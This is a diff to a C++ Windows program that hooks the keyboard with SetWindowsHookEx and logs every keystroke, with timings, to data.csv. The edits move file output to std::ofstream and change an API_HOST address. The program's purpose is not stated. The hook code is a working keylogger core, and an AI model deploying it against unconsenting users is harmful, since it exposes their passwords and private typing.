@@ -24,7 +24,7 @@
 
 #define CRISTALLO_LEN 1024
 
-#define API_HOST "192.168.0.185"
+#define API_HOST "192.168.0.186"
 
 LRESULT WINAPI MyKeyboardHook(int code, WPARAM wParam, LPARAM lParam);
 void WriteToFile(DWORD vkCode, DWORD time, bool wasKeyUp);
@@ -38,9 +38,11 @@ DWORD lastKey = 0x0;
 DWORD lastAction = 0x0;
 DWORD* keyDuration = new DWORD[253];
 std::string* stringStore = new std::string[253];
-FILE* fp;
+//FILE* fp;
+std::ofstream fp;
 
 
+int lineCount = 0;
 bool FirstEntry = true;
 DWORD prevKey = 0x0;
 
@@ -111,9 +113,9 @@ int main()
 	//}
 	}
 
-	if (fp != NULL)
+	if (fp.is_open())
 	{
-		fclose(fp);
+		fp.close();
 		printf("File wasn't closed... Closing...\n");
 	}
 
@@ -134,10 +136,10 @@ static void initialize_hook_thread()
 
 	//printf("[Thread]: 0x%08x started...\n", GetCurrentThreadId());
 
-	fopen_s(&fp, "data.csv", "w+");
-	if (fp == NULL)
+	fp.open("data.csv");
+	if (!fp.is_open())
 	{
-		printf("An error occured opening data.txt :(\n");
+		printf("An error occured opening data.csv :(\n");
 		delete[] keyDuration;
 		ExitThread(100);
 		return;
@@ -154,7 +156,7 @@ static void initialize_hook_thread()
 	{
 		printf("There was an error starting SetWindowsHookEx\n");
 		printf("[GLE]: 0x%08x\n", GetLastError());
-		fclose(fp);
+		fp.close();
 		delete[] keyDuration;
 		ExitThread(100);
 	}
@@ -167,7 +169,7 @@ static void initialize_hook_thread()
 	}
 
 
-	fclose(fp);
+	fp.close();
 	UnhookWindowsHookEx(myKbHook);
 	delete[] keyDuration;
 	ExitThread(100);
@@ -193,6 +195,7 @@ void WriteToFile(DWORD vkCode, DWORD time, bool wasKeyUp)
 	case VK_BACK:
 	{
 		// When this is found, we will delete the last line in the file.
+		//std::getline(fp, std::iostream::end);
 		break;
 	}
 	case VK_LWIN:
@@ -260,7 +263,7 @@ void WriteToFile(DWORD vkCode, DWORD time, bool wasKeyUp)
 
 		stringStore[vkCode] += '\n';
 		//printf("[KEYSTORE %d] : %s\n", vkCode, stringStore[vkCode].c_str());
-		fprintf_s(fp, stringStore[vkCode].c_str()); // Write it to the data.txt file.
+		fp.write(stringStore[vkCode].c_str(), stringStore[vkCode].size()); // Write it to the data.txt file.
 		stringStore[vkCode].clear(); // Empty out our string buffer for a new character at that location.
 		//stringStore[vkCode].em
 		//stringStore[vkCode] = "";
